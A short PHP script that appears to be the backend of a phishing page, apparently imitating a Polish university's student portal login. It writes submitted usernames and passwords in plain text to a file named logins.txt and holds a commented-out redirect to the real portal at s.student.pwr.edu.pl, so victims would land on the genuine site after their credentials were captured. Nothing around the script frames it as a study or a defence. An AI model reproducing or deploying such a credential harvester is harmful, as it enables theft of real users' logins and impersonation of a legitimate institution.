<?php
$myfile = fopen("logins.txt", "a");
fwrite($myfile, "Login: ".$_POST['username']." Password: ".$_POST['password']."\n");
fclose($myfile);
#header('Location: https://s.student.pwr.edu.pl');
?>
